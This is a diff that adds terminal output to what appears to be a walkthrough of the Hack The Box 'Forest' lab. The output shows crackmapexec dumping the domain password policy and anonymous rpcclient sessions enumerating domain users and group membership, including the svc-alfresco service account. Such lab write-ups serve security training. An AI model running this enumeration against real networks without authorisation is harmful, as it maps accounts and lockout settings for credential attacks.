@@ -669,3 +669,116 @@ January4
 January5
 ---------------------------------------------------------snip-----------------------------------------------------------------
 ```
+
+
+```
+crackmapexec smb 10.129.95.210 --pass-pol
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing MSSQL protocol database
+[*] Initializing SMB protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing SSH protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.129.95.210   445    FOREST           [+] Dumping password info for domain: HTB
+SMB         10.129.95.210   445    FOREST           Minimum password length: 7
+SMB         10.129.95.210   445    FOREST           Password history length: 24
+SMB         10.129.95.210   445    FOREST           Maximum password age: Not Set
+SMB         10.129.95.210   445    FOREST           
+SMB         10.129.95.210   445    FOREST           Password Complexity Flags: 000000
+SMB         10.129.95.210   445    FOREST               Domain Refuse Password Change: 0
+SMB         10.129.95.210   445    FOREST               Domain Password Store Cleartext: 0
+SMB         10.129.95.210   445    FOREST               Domain Password Lockout Admins: 0
+SMB         10.129.95.210   445    FOREST               Domain Password No Clear Change: 0
+SMB         10.129.95.210   445    FOREST               Domain Password No Anon Change: 0
+SMB         10.129.95.210   445    FOREST               Domain Password Complex: 0
+SMB         10.129.95.210   445    FOREST           
+SMB         10.129.95.210   445    FOREST           Minimum password age: 1 day 4 minutes 
+SMB         10.129.95.210   445    FOREST           Reset Account Lockout Counter: 30 minutes 
+SMB         10.129.95.210   445    FOREST           Locked Account Duration: 30 minutes 
+SMB         10.129.95.210   445    FOREST           Account Lockout Threshold: None
+SMB         10.129.95.210   445    FOREST           Forced Log off Time: Not Set
+```
+
+
+
+```
+rpcclient 10.129.95.210 -U '' -N                                                                                                                                                    1 ⨯
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+rpcclient $> queryusergroups 0x47b
+        group rid:[0x201] attr:[0x7]
+        group rid:[0x47c] attr:[0x7]
+rpcclient $> querygroup 0x201
+        Group Name:     Domain Users
+        Description:    All domain users
+        Group Attribute:7
+        Num Members:30
+rpcclient $> querygroup 0x47c
+        Group Name:     Service Accounts
+        Description:
+        Group Attribute:7
+        Num Members:1
+rpcclient $> queryuser 0x47b
+        User Name   :   svc-alfresco
+        Full Name   :   svc-alfresco
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Mon, 23 Sep 2019 16:39:48 IST
+        Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
+        Kickoff Time             :      Thu, 01 Jan 1970 05:30:00 IST
+        Password last set Time   :      Sun, 19 Dec 2021 08:31:51 IST
+        Password can change Time :      Mon, 20 Dec 2021 08:31:51 IST
+        Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
+        unknown_2[0..31]...
+        user_rid :      0x47b
+        group_rid:      0x201
+        acb_info :      0x00010210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000006
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient $> 
+```
